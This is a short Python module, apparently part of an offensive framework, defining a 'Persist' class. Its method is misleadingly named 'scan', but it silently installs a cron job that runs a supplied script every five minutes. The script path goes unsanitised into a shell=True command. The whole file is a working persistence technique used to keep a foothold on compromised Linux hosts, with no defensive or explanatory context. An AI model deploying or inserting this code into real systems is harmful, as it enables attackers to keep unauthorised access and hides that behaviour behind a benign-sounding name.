import subprocess

class Persist:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P1"
        self.level = "Critical"

    def scan(self, target, script_path, os_type="linux"):
        if os_type == "linux":
            cron_cmd = f"(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/bin/python3 {script_path}') | crontab -"
            try:
                result = subprocess.check_output(cron_cmd, shell=True).decode()
                return {"persistence": "cron_added", "output": result}
            except Exception as e:
                return {"persistence": "failed", "error": str(e)}
        return {"persistence": "unsupported_os"}
